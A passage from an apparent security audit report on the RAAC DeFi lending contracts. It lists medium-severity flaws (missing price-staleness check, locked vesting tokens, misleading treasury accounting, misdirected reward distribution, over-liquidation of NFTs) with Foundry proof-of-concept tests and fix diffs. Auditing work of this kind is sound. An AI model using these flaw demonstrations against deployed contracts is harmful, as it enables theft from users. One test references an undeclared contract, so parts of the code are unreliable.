        uint256 baseTax = swapTaxRate + burnTaxRate;
        if (baseTax == 0 || from == address(0) || to == address(0) || whitelistAddress[from] || whitelistAddress[to] || feeCollector == address(0)) {
            super._update(from, to, amount);
            return;
        }
        uint256 totalTax = amount.percentMul(baseTax);
        uint256 burnAmount = totalTax * burnTaxRate / baseTax;
@>      super._update(from, feeCollector, totalTax - burnAmount);
        super._update(from, address(0), burnAmount);
        super._update(from, to, amount - totalTax);
    }
```

In the case of a transfer between users, while taxes are enabled and a fee collector is set, the update function will directly transfer the funds into the `FeeCollector` contract.
Looking now into the collector contract:

```Solidity
function collectFee(uint256 amount, uint8 feeType) external override nonReentrant whenNotPaused returns (bool) {
        if (amount == 0 || amount > MAX_FEE_AMOUNT) revert InvalidFeeAmount();
        if (feeType > 7) revert InvalidFeeType();
        raacToken.safeTransferFrom(msg.sender, address(this), amount);
@>      _updateCollectedFees(amount, feeType);
        emit FeeCollected(feeType, amount);
        return true;
    }
```

we can already see within this function, that the RAAC Token is not using the intended functionality to deposit the tokens into the Fee Collector.

Going a bit further down within the contract we will than see the following:

```Solidity
function distributeCollectedFees() external override nonReentrant whenNotPaused {
        if (!hasRole(DISTRIBUTOR_ROLE, msg.sender)) revert UnauthorizedCaller();
1.@>    uint256 totalFees = _calculateTotalFees();
        if (totalFees == 0) revert InsufficientBalance();
        uint256[4] memory shares = _calculateDistribution(totalFees);
2.@>     _processDistributions(totalFees, shares);
        delete collectedFees;
        emit FeeDistributed(shares[0], shares[1], shares[2], shares[3]);
    }

/// *** SNIP *** ///

function _calculateTotalFees() internal view returns (uint256) {
1.2@>    return collectedFees.protocolFees +
               collectedFees.lendingFees +
               collectedFees.performanceFees +
               collectedFees.insuranceFees +
               collectedFees.mintRedeemFees +
               collectedFees.vaultFees +
               collectedFees.swapTaxes +
               collectedFees.nftRoyalties;
    }

```

The total amount of fees collected is reliant on `FeeCollector::_updateCollectedFees` written by the `FeeCollector::collectFee` function. The total amount for distribution is calculated within `FeeCollector::_calculateTotalFees` which simply returns state being written by the `collectFee` function. The total amount calculated here will directly be passed into `FeeCollector::_processDistributions`. Therefore the contract lacks the functionality to effectively deal with directly transferred RAAC Tokens, since they are bypassing important state updates to effectively be distributed.

## Impact

A certainly mitigating factor for this is though, that the FeeCollector possesses a rescue function, so funds, which would be send into the contract bypassing the accounting are not lost, however it requires manual intervention from the admin side to free those funds. Furthermore those funds are not accounted for within the type of fee they are meant for and this will still be an impact, since it is in the implementation as it is, impossible to tell in which category of fees funds fall, which did not go through the accounting. As an example, those fees could easily be mistaken as donations and easily sent into the wrong fee bucket leaving potentially holes in the balance somewhere else.
Also, the emergency withdraw can only send RAAC Tokens into the treasury and on top of that, would remove the whole `balanceOf()` from the contract, it should pretty much only be used sparely.

The likelihood rating for me is a clear high, since it happens during normal operations, while the impact is a strong low, funds aren't lost, but almost certainly misrouted and would require an emergency withdraw. Therefore I conclude the total severity as a Medium in this case.

## Tools Used

Manual Review

## Recommended Mitigation

Use `collectFee` within the RAAC Token Contract to deposit the fees into the Fee Collector like so:

```diff
+import {IFeeCollector} from "../../interfaces/core/collectors/IFeeCollector.sol";
function _update(
        address from,
        address to,
        uint256 amount
    ) internal virtual override {
        uint256 baseTax = swapTaxRate + burnTaxRate;
        // Skip tax for whitelisted addresses or when fee collector disabled
        if (baseTax == 0 || from == address(0) || to == address(0) || whitelistAddress[from] || whitelistAddress[to] || feeCollector == address(0)) {
            super._update(from, to, amount);
            return;
        }
        // All other cases where tax is applied
        uint256 totalTax = amount.percentMul(baseTax);
        uint256 burnAmount = totalTax * burnTaxRate / baseTax;
-       super._update(from, feeCollector, totalTax - burnAmount);
        super._update(from, address(0), burnAmount);
        super._update(from, to, amount - totalTax);
+       uint256 feeCollectorAmount = totalTax - burnAmount;
+       if(feeCollectorAmount > 0){
+           require(whitelistAddress[feeCollector], "Fee collector is not whitelisted"); // Important to avoid an infinite loop
+           super._update(from, address(this), feeCollectorAmount);
+           approve(feeCollector, feeCollectorAmount);
+           IFeeCollector(feeCollector).collectFee(feeCollectorAmount, 0);
+       }
    }
```

If the above solution seems suitable, please don't forget to tie the whitelisting of the Fee Collector

a) into the constructor

b) enable/disable events

otherwise funds will not be transferable, but every transaction would revert with an OOG.

Alternative solution would be a nested `if-else-block`.

    
# Medium Risk Findings

## <a id='M-01'></a>M-01. getNFTPrice in LendingPool has no checks in place to check for stale prices            



## Description

`LendingPool::getNFTPrice` is supposed to check if the provided price for given NFT is current enough for any action relying on the function, and probably, if not, revert. Even though the natspec highlights this functionality, the function fails to implement this logic.

## Vulnerable Code

`LendingPool::getNftPrice`

```javascript
     /**
     * @notice Gets the current price of an NFT from the oracle
     * @param tokenId The token ID of the NFT
     * @return The price of the NFT
     *
@>   * Checks if the price is stale
     */
    function getNFTPrice(uint256 tokenId) public view returns (uint256) {
@>      (uint256 price, uint256 lastUpdateTimestamp) = priceOracle.getLatestPrice(tokenId);
        if (price == 0) revert InvalidNFTPrice();
@>      // Here should be some sort of a staleness check
        return price;
    }
```

As you can see in the natspec and the code, the function should perform a staleness check, fetched the `lastUpdateTimestamp` but in the end, no checks on the staleness are performed.

## Impact

No stale data check can leave the property not updated for extensive periods of time. The impact arising is, that the NFT could have gained or lost value since it was last updated, but since no timeframe is enforced the last update could be weeks, months, years or decades old. The result of this is that the real fair value of this NFT might be over- or underestimated in current state, so either a user which would be due to liquidation would not be liquidatable or potentially missing out on gains his NFT would usually have provided. Either way, the protocol should implement proposed staleness check from the natspec to ensure that no action regarding the NFT can be taken until the price is evaluated in a current past, to prevent harm from protocol or user.

## Tools Used

Manual Review

## Recommended Mitigation

```diff
+ uint256 public maxStaleness;
function getNFTPrice(uint256 tokenId) public view returns (uint256) {
        (uint256 price, uint256 lastUpdateTimestamp) = priceOracle.getLatestPrice(tokenId);
        if (price == 0) revert InvalidNFTPrice();
+       if (block.timestamp - lastUpdateTimestamp > maxStaleness) {
+           // Do Something;
+       } 
        return price;
    }
```

## <a id='M-02'></a>M-02. RAACReleaseOrchastrator has emergencyRevoke transfer cleared tokens to self locking them in the contract.            



## Description

`RAACReleaseOrchastrator::emergencyRevoke` is an emergency function to clear a vesting schedule for a beneficiary. While the function most certainly clears a vesting schedule, it will transfer "cleared" RAAC Tokens to itself in the process, locking them indefinitely.

## Vulnerable Code

`RAACReleaseOrchastrator::emergencyRevoke`:

```javascript
    function emergencyRevoke(address beneficiary) external onlyRole(EMERGENCY_ROLE) {
        VestingSchedule storage schedule = vestingSchedules[beneficiary];
        if (!schedule.initialized) revert NoVestingSchedule();
        uint256 unreleasedAmount = schedule.totalAmount - schedule.releasedAmount;
        delete vestingSchedules[beneficiary];
        if (unreleasedAmount > 0) {
@>          raacToken.transfer(address(this), unreleasedAmount);
@>          emit EmergencyWithdraw(beneficiary, unreleasedAmount);
        }
        emit VestingScheduleRevoked(beneficiary);
    }
```

As you can see in the highlighted code, the `RAAC Token` will be transferred to the contract itself, but the contract has no functionality to withdraw those tokens or to reinstate a new vesting schedule for those tokens.

## Impact

While an emergency revoke of the vesting schedule might be necessary due to several factors (lost private keys, compromised private keys, and many more), it is certainly undesirable to have potentially large amounts of RAAC Token supply locked within this contract. This would dilute the market of RAAC, resulting in undervaluing of the tokens. Also the vesting partner, those tokens would have been meant for, has no possibility of still redeeming those tokens (in case the function was called due to private key compromise). An impact rating as Medium seems accurate since there is no actual harm to protocol functionality, the issue simply dilutes the circulating supply of the tokens.

Likelyhood: Low
Impact: Medium

Severity: Medium

## Tools Used

Manual Review

## Recommended Mitigation

Depending on the potential emergencies this function is supposed to handle, there would be several mitigations:

1. Allow implementing a new vesting schedule for those tokens, e.g. if a vesting receiver lost access to their private keys.
2. Transfer those funds into the treasury or make them available as additional liquidity on the market, just to make them usable at all.
3. Directly burn them.

## <a id='M-03'></a>M-03. Treasury.sol has misleading accounting, leading to uninformed government proposals            



## Description

`Treasurey::getTotalValue` returns `uint256 _totalValue` for accounting and transparency purposes. However `uint256 _totalValue` does return a total cross-ERC20 token count and is therefor unusable and misleading.
Furthermore the function `Treasury::allocateFunds` allocates a non ERC20 specific value towards something (most likely a proposal), lacks though the specification of which ERC20 is being allocated and therefore makes this function useless.

## Vulnerable Code

`Treasury::deposit`:

```Solidity
function deposit(address token, uint256 amount) external override nonReentrant {
        if (token == address(0)) revert InvalidAddress();
        if (amount == 0) revert InvalidAmount();
        IERC20(token).transferFrom(msg.sender, address(this), amount);
        _balances[token] += amount;
@>      _totalValue += amount;
        emit Deposited(token, amount);
    }
```

As you can see here in the deposit function any user can deposit any ERC20 token into the Treasury Contract and `uint256 _totalValue` will simply add the token amount, disregarding if the user actually deposits `WBTC` or `SHIB` (as example), making the value kind of useless at all.

`Treasury::getTotalValue`:

```javascript
function getTotalValue() external view override returns (uint256) {
        return _totalValue;
    }
```

Here the value will get returned for transparency reasons, making the impression by the naming that it actually returns a meaningful value, but as said above, the return value of this function is entirely meaningless.

`Treasury::allocateFunds`:

```Solidity
    function allocateFunds(
        address recipient,
        uint256 amount
    ) external override onlyRole(ALLOCATOR_ROLE) {
        if (recipient == address(0)) revert InvalidRecipient();
        if (amount == 0) revert InvalidAmount();
        _allocations[msg.sender][recipient] = amount;
        emit FundsAllocated(recipient, amount);
    }
```

Here is basically the same issue, non-ERC20 specific funds are being allocated (presumably towards a proposal(?)), but simply just allocated a random number of cross-ERC20 tokens. Without a specific token being allocated this function misses a crucial part for it's use case.

## Impact

The impact of this confusing accounting mechanism is relatively straight forward.

Consider the following scenario:

100 Total Tokens in the contract, as an extreme example 2 wBTC and 98 SHIB tokens.

A governance user wants for example to form a proposal to spend some treasury funds on a charity donation, he proposes to spend 2% of the treasuries total value (the final value he would calculate from `Treasury::getTotalValue`). At this point already the problem is quite obvious:
2% of the total value according to the function could be 2 wBTC, 1 wBTC and 1 SHIB or 2 SHIB which could barely be further away from each other in terms of value.

The same logic applies to the `Treasury::allocateFunds`, nobody could remotely tell which part and what actual value is being allocated.

Furthermore the contract allows accounting for any ERC-20 tokens without whitelist via the deposit function, allowing users to deposit rebasing tokens, blacklist tokens and ERC20 tokens with malicious hooks, which all of them would be part of the accounting system of the treasury, while especially the last category, the treasury would not even be able to get rid of.

Likelihood: High

Impact: Low

Total Severity: Medium,
since it is influencing off-chain decision making and does not pose a risk towards the smart contract system itself, but the mentioned decision making could lead to misplaced spending proposals within the community and therefor indirectly harm the protocol.

## Tools Used

Manual Review

## Recommended Fix

The code below removes unnecessary accounting of `uint256 _totalValue` and it's misleading properties. Users can still fetch significant balances via `Treasury::getBalance`, so important functionality is still there. Also allocations would now be token specific and therefor meaningful.

```diff
contract Treasury is ITreasury, AccessControl, ReentrancyGuard {
    bytes32 public constant MANAGER_ROLE = keccak256("MANAGER_ROLE");    
    bytes32 public constant ALLOCATOR_ROLE = keccak256("ALLOCATOR_ROLE");  
    mapping(address => uint256) private _balances;                         
-   mapping(address => mapping(address => uint256)) private _allocations; 
+   mapping(address => mapping(address => mapping(address => uint256))) private _allocations;
-   uint256 private _totalValue;                                        

	/// **SNIP** ///

    function deposit(address token, uint256 amount) external override nonReentrant {
        if (token == address(0)) revert InvalidAddress();
        if (amount == 0) revert InvalidAmount();
        IERC20(token).transferFrom(msg.sender, address(this), amount);
        _balances[token] += amount;
-       _totalValue += amount;
        emit Deposited(token, amount);
    }


    function allocateFunds(
        address recipient,
        uint256 amount,
		address token
    ) external override onlyRole(ALLOCATOR_ROLE) {
        if (recipient == address(0)) revert InvalidRecipient();
        if (amount == 0) revert InvalidAmount();
-       _allocations[msg.sender][recipient] = amount;
-       emit FundsAllocated(recipient, amount);
+       _allocations[msg.sender][recipient][token] = amount;
+       emit FundsAllocated(recipient, amount, token);
    }

-   function getTotalValue() external view override returns (uint256) {
-       return _totalValue;
-   }

	/// **SNIP** ///

}
```

## <a id='M-04'></a>M-04. balanceOf(address(this)) in StabilityPool causes reward distribution to be higher than it should be            



## Description

In `StabilityPool::calculateRaacRewards` the function uses `raacToken.balanceOf(address(this))` to calculate the rewards for a user during withdrawal, this leads to an unwanted behavior, considering the contract allows depositing `RAACToken` via `StabilityPool::depositRAACFromPool`.

## Vulnerable Code

`StabilityPool::calculateRaacRewards`:

```Solidity
function calculateRaacRewards(address user) public view returns (uint256) {
        uint256 userDeposit = userDeposits[user];
        uint256 totalDeposits = deToken.totalSupply();
@>      uint256 totalRewards = raacToken.balanceOf(address(this));
        if (totalDeposits < 1e6) return 0;
        return (totalRewards * userDeposit) / totalDeposits;

    }
```

`StabilityPool::depositRAACFromPool`:

```Solidity
function depositRAACFromPool(uint256 amount) external onlyLiquidityPool validAmount(amount) {
        uint256 preBalance = raacToken.balanceOf(address(this));
        raacToken.safeTransferFrom(msg.sender, address(this), amount);
        uint256 postBalance = raacToken.balanceOf(address(this));
        if (postBalance != preBalance + amount) revert InvalidTransfer();
        // TODO: Logic for distributing to managers based on allocation
        emit RAACDepositedFromPool(msg.sender, amount);

    }
```

As you can see, `StabilityPool` expects deposits from the `LiquidityPool` (implementation pending) for allocation towards the managers of the markets. The issue arising is that those deposits will be wrongfully distributed as rewards to the users, leaving the original intend behind.

## PoC

Since the PoC is a foundry test I have added a Makefile at the end of this report to simplify installation for your convenience. Otherwise if console commands would be prefered:

First run: `npm install --save-dev @nomicfoundation/hardhat-foundry`

Second add: `require("@nomicfoundation/hardhat-foundry");` on top of the `Hardhat.Config` file in the projects root directory.

Third run: `npx hardhat init-foundry`

And lastly, you will encounter one of the mock contracts throwing an error during compilation, this error can be circumvented by commenting out the code in entirety (`ReserveLibraryMocks.sol`).

And the test should be good to go:

After following above steps copy & paste the following code into `./test/invariant/PoC.t.sol` and run `forge test --mt test_pocDepositsToStabilityPoolAreDistributedWrogfullyAsRewards -vv`

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {StabilityPool} from "../../contracts/core/pools/StabilityPool/StabilityPool.sol";
import {LendingPool} from "../../contracts/core/pools/LendingPool/LendingPool.sol";
import {CrvUSDToken} from "../../contracts/mocks/core/tokens/crvUSDToken.sol";
import {RAACHousePrices} from "../../contracts/core/oracles/RAACHousePriceOracle.sol";
import {RAACNFT} from "../../contracts/core/tokens/RAACNFT.sol";
import {RToken} from "../../contracts/core/tokens/RToken.sol";
import {DebtToken} from "../../contracts/core/tokens/DebtToken.sol";
import {DEToken} from "../../contracts/core/tokens/DEToken.sol";
import {RAACToken} from "../../contracts/core/tokens/RAACToken.sol";
import {RAACMinter} from "../../contracts/core/minters/RAACMinter/RAACMinter.sol";
contract PoC is Test {
    StabilityPool public stabilityPool;
    LendingPool public lendingPool;
    CrvUSDToken public crvusd;
    RAACHousePrices public raacHousePrices;
    RAACNFT public raacNFT;
    RToken public rToken;
    DebtToken public debtToken;
    DEToken public deToken;
    RAACToken public raacToken;
    RAACMinter public raacMinter;

    address owner;
    address oracle;
    address user1;
    address user2;
    address user3;
    uint256 constant STARTING_TIME = 1641070800;
    uint256 public currentBlockTimestamp;
    uint256 constant WAD = 1e18;
    uint256 constant RAY = 1e27;

    function setUp() public {
        vm.warp(STARTING_TIME);
        currentBlockTimestamp = block.timestamp;
        owner = address(this);
        oracle = makeAddr("oracle");
        user1 = makeAddr("user1");
        user2 = makeAddr("user2");
        user3 = makeAddr("user3");
        uint256 initialPrimeRate = 0.1e27;
        raacHousePrices = new RAACHousePrices(owner);
        vm.prank(owner);
        raacHousePrices.setOracle(oracle);
        crvusd = new CrvUSDToken(owner);
        raacNFT = new RAACNFT(address(crvusd), address(raacHousePrices), owner);
        rToken = new RToken("RToken", "RToken", owner, address(crvusd));
        debtToken = new DebtToken("DebtToken", "DT", owner);
        deToken = new DEToken("DEToken", "DEToken", owner, address(rToken));
        vm.prank(owner);
        crvusd.setMinter(owner);
        vm.prank(owner);
        lendingPool = new LendingPool(
                            address(crvusd),
                            address(rToken),
                            address(debtToken),
                            address(raacNFT),
                            address(raacHousePrices),
                            initialPrimeRate
                        );
        rToken.setReservePool(address(lendingPool));
        debtToken.setReservePool(address(lendingPool));
        rToken.transferOwnership(address(lendingPool));
        debtToken.transferOwnership(address(lendingPool));
        stabilityPool = new StabilityPool(address(owner));
        deToken.setStabilityPool(address(stabilityPool));
        raacToken = new RAACToken(owner, 0, 0);
        raacMinter = new RAACMinter(address(raacToken), address(stabilityPool), address(lendingPool), owner);
        stabilityPool.initialize(address(rToken), address(deToken), address(raacToken), address(raacMinter), address(crvusd), address(lendingPool));
        vm.prank(owner);
        raacToken.setMinter(address(raacMinter));
        attacker = new Attacker(address(raacNFT));
        crvusd.mint(address(attacker), type(uint128).max);
        crvusd.mint(user1, type(uint128).max);
        crvusd.mint(user2, type(uint128).max);
        crvusd.mint(user3, type(uint128).max);
    }

    function test_pocDepositsToStabilityPoolAreDistributedWrogfullyAsRewards() public {
        // Setting up the scenario, 2 users deposit rToken into StabilityPool
        vm.startPrank(user1);
        crvusd.approve(address(lendingPool), type(uint256).max);
        rToken.approve(address(stabilityPool), type(uint256).max);
        lendingPool.deposit(10e18);
        stabilityPool.deposit(10e18);
        vm.stopPrank();
        vm.startPrank(user2);
        crvusd.approve(address(lendingPool), type(uint256).max);
        rToken.approve(address(stabilityPool), type(uint256).max);
        lendingPool.deposit(10e18);
        stabilityPool.deposit(10e18);
        vm.stopPrank();
        // Substituting liquidityPool with owner, since there is no liquidity pool yet
        vm.prank(address(raacMinter));
        raacToken.mint(owner, 10e18);
        vm.startPrank(owner);
        raacToken.manageWhitelist(address(stabilityPool), true);
        raacToken.manageWhitelist(address(raacMinter), true);
        raacToken.manageWhitelist(owner, true);
        stabilityPool.setLiquidityPool(owner);
        raacToken.approve(address(stabilityPool), 10e18);
        // Depositing the RAAC tokens into the StabilityPool
        stabilityPool.depositRAACFromPool(10e18);
        vm.stopPrank();
        assertEq(raacToken.balanceOf(address(stabilityPool)), 10e18);
        // And here we withdraw, with the result that users emptied the stability pool
        vm.prank(user1);
        stabilityPool.withdraw(10e18);
        vm.prank(user2);
        stabilityPool.withdraw(10e18);
        assertEq(raacToken.balanceOf(address(stabilityPool)), 0);
    }
}
```

As you can easily see running the test above, all RAAC Tokens sent to the Stability Pool are now withdrawn by the 2 users.

## Impact

Distributing accidentally those funds, meant for Manager/Market allocations, leaves the functionality of any following logic useless by overpaying the users. The likelihood is High since the only precondition was has to be met is, that RAAC needs to be deposited.
Also, the misdistribution of funds towards the users in this case (or a malicious actor who frontruns the reward distribution as mentioned in an earlier report), causes a High impact to the system since the funds for implemented logic are simply not there and furthermore not fairly distributed.

Therefore it is a total severity of High.

## Tools Used

Manual Review

## Recommended Mitigation

Disconnect from `balanceOf()` accounting during reward distribution by tracking `uint256 totalRewards` with received minted RAAC tokens - Distributed RAAC Tokens or maybe better, track deposits from Liquidity Pool seperatly and deducting them before distribution:

```diff
+ uint256 raacDepositedFromPool;
function depositRAACFromPool(uint256 amount) external onlyLiquidityPool validAmount(amount) {
        uint256 preBalance = raacToken.balanceOf(address(this));
        raacToken.safeTransferFrom(msg.sender, address(this), amount);
        uint256 postBalance = raacToken.balanceOf(address(this));
        if (postBalance != preBalance + amount) revert InvalidTransfer();
+       raacDepositedFromPool += amount;
        // TODO: Logic for distributing to managers based on allocation
        emit RAACDepositedFromPool(msg.sender, amount);
    }
    
function calculateRaacRewards(address user) public view returns (uint256) {
        uint256 userDeposit = userDeposits[user];
        uint256 totalDeposits = deToken.totalSupply();
-       uint256 totalRewards = raacToken.balanceOf(address(this));
+       uint256 totalRewards = raacToken.balanceOf(address(this)) - raacDepositedFromPool;
        if (totalDeposits < 1e6) return 0;
        return (totalRewards * userDeposit) / totalDeposits;
    }
```

## Appendix

Copy the following import into your `Hardhat.Config` file in the projects root dir:
`require("@nomicfoundation/hardhat-foundry");`

Paste the following into a new file "Makefile" into the projects root directory:

```Solidity
.PHONY: install-foundry init-foundry all

  

install-foundry:

    npm install --save-dev @nomicfoundation/hardhat-foundry

  

init-foundry: install-foundry

    npx hardhat init-foundry


  

# Default target that runs everything in sequence

all: install-foundry init-foundry 
```

And run `make all`

## <a id='M-05'></a>M-05. closeLiquidation within LendingPool does not allow partial repayments, which can cause massive losses to users within edge case            



## Description

While not accepting partial repayments within `LendingPool::closeLiquidation` is certainly a design choice, it also causes an edge case in which a user who is subject into liquidation can still deposit additional NFTs into the protocol, which would then be liquidated as well, causing an unjustified liquidation on an NFT value way over anything justifiable.



## Vulnerable Code & Details

`LendingPool::closeLiquidation`:

```Solidity
function closeLiquidation() external nonReentrant whenNotPaused {
        address userAddress = msg.sender;
        if (!isUnderLiquidation[userAddress]) revert NotUnderLiquidation();
        ReserveLibrary.updateReserveState(reserve, rateData);
        if (block.timestamp > liquidationStartTime[userAddress] + liquidationGracePeriod) {
            revert GracePeriodExpired();
        }
        UserData storage user = userData[userAddress];
        uint256 userDebt = user.scaledDebtBalance.rayMul(reserve.usageIndex);
        if (userDebt > DUST_THRESHOLD) revert DebtNotZero();
        isUnderLiquidation[userAddress] = false;
        liquidationStartTime[userAddress] = 0;
        emit LiquidationClosed(userAddress);
    }
```

`LendingPool::depositNFT`:

```Solidity
function depositNFT(uint256 tokenId) external nonReentrant whenNotPaused {
        ReserveLibrary.updateReserveState(reserve, rateData);
        if (raacNFT.ownerOf(tokenId) != msg.sender) revert NotOwnerOfNFT();
        UserData storage user = userData[msg.sender];
        if (user.depositedNFTs[tokenId]) revert NFTAlreadyDeposited();
        user.nftTokenIds.push(tokenId);
        user.depositedNFTs[tokenId] = true;
        raacNFT.safeTransferFrom(msg.sender, address(this), tokenId);
        emit NFTDeposited(msg.sender, tokenId);
    }
```

### After looking at the code above consider the following scenario:

User Bob holds an NFT within RAAC worth 50k USD and loaned 40k USD against it within the protocol in anticipation of it's value increasing over time.
Now RAAC decides to drop some new Condos on the market for an early investment price of only 60k USD each, so bob decides to use his life savings to buy 4 of those units for this amazing deal, after all, he can deposit them back into the contract and borrow against it.
Now right before Bob deposits his newly bought assets RAACs price oracle updated the price on Bobs previous unit to 40k USD and initiates liquidation of Bob, since he is now undercollateralized.

Bob though deposits unknowingly his newly acquired NFTs into the contract to borrow against them only to realize that he is currently being liquidated. Having spent his remaining savings on those condos, Bob now does not have sufficient money to repay the old debt and will be liquidated with a Health Factor way above 1e18, losing all his investment.



## PoC

Since the PoC is a foundry test I have added a Makefile at the end of this report to simplify installation for your convenience. Otherwise if console commands would be prefered:

First run: `npm install --save-dev @nomicfoundation/hardhat-foundry`

Second add: `require("@nomicfoundation/hardhat-foundry");` on top of the `Hardhat.Config` file in the projects root directory.

Third run: `npx hardhat init-foundry`

And lastly, you will encounter one of the mock contracts throwing an error during compilation, this error can be circumvented by commenting out the code in entirety (`ReserveLibraryMocks.sol`).

And the test should be good to go:

##### To run the following PoC please apply a "fix" into StabilityPool as follows:

`StabilityPool::liquidateBorrower`

```diff
/// *** SNIP *** ///
+bool approveSuccess = crvUSDToken.approve(address(lendingPool), type(uint256).max); 
-bool approveSuccess = crvUSDToken.approve(address(lendingPool), scaledUserDebt; 
/// *** SNIP *** ///
```

As mentioned in a previous report, this approval issue makes liquidating users impossible.

`./test/invariant/foundry/PoC.t.sol`

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import {Test, console} from "forge-std/Test.sol";
import {StabilityPool} from "../../contracts/core/pools/StabilityPool/StabilityPool.sol";
import {LendingPool} from "../../contracts/core/pools/LendingPool/LendingPool.sol";
import {CrvUSDToken} from "../../contracts/mocks/core/tokens/crvUSDToken.sol";
import {RAACHousePrices} from "../../contracts/core/oracles/RAACHousePriceOracle.sol";
import {RAACNFT} from "../../contracts/core/tokens/RAACNFT.sol";
import {RToken} from "../../contracts/core/tokens/RToken.sol";
import {DebtToken} from "../../contracts/core/tokens/DebtToken.sol";
import {DEToken} from "../../contracts/core/tokens/DEToken.sol";
import {RAACToken} from "../../contracts/core/tokens/RAACToken.sol";
import {RAACMinter} from "../../contracts/core/minters/RAACMinter/RAACMinter.sol";
contract PoC is Test {
    StabilityPool public stabilityPool;
    LendingPool public lendingPool;
    CrvUSDToken public crvusd;
    RAACHousePrices public raacHousePrices;
    RAACNFT public raacNFT;
    RToken public rToken;
    DebtToken public debtToken;
    DEToken public deToken;
    RAACToken public raacToken;
    RAACMinter public raacMinter;
    address owner;
    address oracle;
    address user1;
    address user2;
    address user3;
    uint256 constant STARTING_TIME = 1641070800;
    uint256 public currentBlockTimestamp;
    uint256 constant WAD = 1e18;
    uint256 constant RAY = 1e27;

    function setUp() public {
        vm.warp(STARTING_TIME);
        currentBlockTimestamp = block.timestamp;
        owner = address(this);
        oracle = makeAddr("oracle");
        user1 = makeAddr("user1");
        user2 = makeAddr("user2");
        user3 = makeAddr("user3");
        uint256 initialPrimeRate = 0.1e27;
        raacHousePrices = new RAACHousePrices(owner);
        vm.prank(owner);
        raacHousePrices.setOracle(oracle);
        crvusd = new CrvUSDToken(owner);
        raacNFT = new RAACNFT(address(crvusd), address(raacHousePrices), owner);
        rToken = new RToken("RToken", "RToken", owner, address(crvusd));
        debtToken = new DebtToken("DebtToken", "DT", owner);
        deToken = new DEToken("DEToken", "DEToken", owner, address(rToken));
        vm.prank(owner);
        crvusd.setMinter(owner);
        vm.prank(owner);
        lendingPool = new LendingPool(
                            address(crvusd),
                            address(rToken),
                            address(debtToken),
                            address(raacNFT),
                            address(raacHousePrices),
                            initialPrimeRate
                        );
        rToken.setReservePool(address(lendingPool));
        debtToken.setReservePool(address(lendingPool));
        rToken.transferOwnership(address(lendingPool));
        debtToken.transferOwnership(address(lendingPool));
        stabilityPool = new StabilityPool(address(owner));
        deToken.setStabilityPool(address(stabilityPool));
        raacToken = new RAACToken(owner, 0, 0);
        raacMinter = new RAACMinter(address(raacToken), address(stabilityPool), address(lendingPool), owner);
        stabilityPool.initialize(address(rToken), address(deToken), address(raacToken), address(raacMinter), address(crvusd), address(lendingPool));
        vm.prank(owner);
        raacToken.setMinter(address(raacMinter));
        lendingPool.setStabilityPool(address(stabilityPool));
        crvusd.mint(user1, type(uint128).max);
        crvusd.mint(user2, type(uint128).max);
        crvusd.mint(user3, type(uint128).max);
    }

  
    function test_userLosingAllNftsWithWrongTiming() public {
        /// Providing Liquidity to LendingPool and StabilityPool
        crvusd.mint(address(stabilityPool), 100e18);
        vm.startPrank(user3);
        crvusd.approve(address(lendingPool), 10e18);
        lendingPool.deposit(10e18);
        vm.stopPrank();
        /// Bob purchases his 1. Nft, deposits it and takes a loan
        vm.prank(oracle);
        raacHousePrices.setHousePrice(1, 5e18);
        vm.startPrank(user1);
        crvusd.approve(address(raacNFT), type(uint256).max);
        raacNFT.mint(1, 5e18);
        raacNFT.approve(address(lendingPool), 1);
        lendingPool.depositNFT(1);
        lendingPool.borrow(4e18);
        vm.stopPrank();
        /// The price gets adjusted downwards and liquidation will be initiated
        vm.prank(oracle);
        raacHousePrices.setHousePrice(1, 4e18);
        vm.prank(user2);
        lendingPool.initiateLiquidation(user1);
        /// Bob purchases further NFTs, deposits them and loses them all without anything he can do about it
        vm.startPrank(oracle);
        raacHousePrices.setHousePrice(2, 5e18);
        raacHousePrices.setHousePrice(3, 5e18);
        raacHousePrices.setHousePrice(4, 5e18);
        raacHousePrices.setHousePrice(5, 5e18);
        vm.stopPrank();
        vm.startPrank(user1);
        raacNFT.mint(2, 5e18);
        raacNFT.approve(address(lendingPool), 2);
        lendingPool.depositNFT(2);
        raacNFT.mint(3, 5e18);
        raacNFT.approve(address(lendingPool), 3);
        lendingPool.depositNFT(3);
        raacNFT.mint(4, 5e18);
        raacNFT.approve(address(lendingPool), 4);
        lendingPool.depositNFT(4);
        raacNFT.mint(5, 5e18);
        raacNFT.approve(address(lendingPool), 5);
        lendingPool.depositNFT(5);
        // Just for good measure bob tries to close the liquidation, knowing he should be very much overcolleteralized but it doesnt work.
        vm.expectRevert();
        lendingPool.closeLiquidation();
        vm.stopPrank();
        /// The Liquidation will be executed, and bob loses all his NFTs
        uint256 blockTime = block.timestamp;
        vm.warp(blockTime + 4 * 1 days);
        console.log("User Health Factor at time of Liquidation: ", lendingPool.calculateHealthFactor(user1) / 1e18);
        assert(lendingPool.calculateHealthFactor(user1) > 1e18);
        vm.prank(owner);
        stabilityPool.liquidateBorrower(user1);
        console.log("User Collateral Value after liquidation: ", debtToken.balanceOf(user1));
        assertEq(0, lendingPool.getUserCollateralValue(user1));
    }
```

After running it via `forge test --mt test_userLosingAllNftsWithWrongTiming -vv` we can see the following output:

```Solidity
Ran 1 test for test/invariant/Unit.t.sol:Unit
[PASS] test_userLosingAllNftsWithWrongTiming() (gas: 2051744)
Logs:
  User Health Factor at time of Liquidation:  4
  User Collateral Value after liquidation:  0

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 29.19ms (11.84ms CPU time)

Ran 1 test suite in 53.44ms (29.19ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

The output showcasing clearly, that the user lost NFT IDs 2-5 too, not only ID 1. Therefor the user lost in this scenario 20e18 tokens on top of the intended liquidation.



## Impact

Since this issue can only arise under certain pre-conditions and has a very limited timeframe to occur the likelihood would be rated as a low - medium.
Losing NFT value beyond the intend of liquidation though, is a severe financial harm to the user, therefor the impact is to be rated high.

As result i conclude a severity of High in total is justified, simply because the impact can be devastating.



## Tools Used

Manual Review & Foundry



## Recommended Fix

Since other functions use already logic which makes usage of functions impossible during initiated liquidation, consider adding the same access control to deposit NFTs to avoid edge cases or rethink changing the `closeLiquidation` function into a health factor based functionality. Assuming the liquidation logic is intended the way it is I would though stick with access control as shown here:

```diff
+ error CanNotDepositNFTDuringLiquidation();
function depositNFT(uint256 tokenId) external nonReentrant whenNotPaused {
        ReserveLibrary.updateReserveState(reserve, rateData);
